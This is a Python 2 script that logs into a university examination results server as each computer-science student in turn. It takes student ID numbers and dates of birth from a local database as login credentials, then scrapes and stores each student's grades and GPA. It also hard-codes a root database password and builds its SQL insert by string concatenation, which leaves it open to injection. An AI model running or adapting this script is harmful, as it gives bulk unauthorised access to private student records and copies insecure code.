import MySQLdb,urllib,urllib2,cookielib
from BeautifulSoup import BeautifulSoup
db = MySQLdb.connect("localhost","root","rgukt123","grades")
print "\n"
print "[+] Initialising all Modules to get CSE Results\n"
c = db.cursor()
c.execute("select id,FDOB,name from 2009B where branch like '%Computer%';")
idpass=c.fetchall()
print "[+] Fetched all CSE Student examination credentials\n"
print "[+] Sending Requests to Examination Server\n"
for row in idpass:
	username = str(row[0].strip())
	password = str(row[1].strip())
	oname = str(row[2])
	cj = cookielib.CookieJar()
	opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
	login_data = urllib.urlencode({'idnum' : username, 'dob' : password})
	opener.open('http://results.rgukt.in:8080/Results/Engg3Sem209/index.php', login_data)
	resp = opener.open('http://results.rgukt.in:8080/Results/Engg3Sem209/endsem.php')
	soup=BeautifulSoup(resp)
	det=soup.findAll('table',{ "border":"1","width":"700"})
	rows=det[0].find('td',text='Student Name : ')
	name=str(rows.findNext('td').text)
	marks=det[1].findAll('td')
	mar=marks[5:]
	grades=[]
	for i in range(3,len(mar),5):
		grades.append(str(mar[i].text))
	cred=soup.findAll('table')
	tds=cred[4].findAll('td')
	sgpa=str(tds[1].text)
	cred=str(tds[3].text )
	print sgpa,cred
	c.execute("INSERT INTO `GPA` (`ID`, `Name`, `COA`, `COAL`, `PPL`, `PPLL`, `AOA`, `TOC`, `Breadth`, `SGPA`, `Credits`) VALUES ('"""+username+"""', '"""+name+"""', '"""+grades[0]+"""', '"""+grades[1]+"""', '"""+grades[2]+"""', '"""+grades[3]+"""', '"""+grades[4]+"""', '"""+grades[5]+"""', '"""+grades[6]+"""','"""+sgpa+"""', '"""+cred+"""');""")
	print "[+] Results of %s-%s is Fetched\n"%(username,oname)
	db.commit()
print "[+] Hmm... No More Students Boss Quitting on your Command.\n"
print "[+] Forgot to tell you Have a Good Day Boss :-) \n"
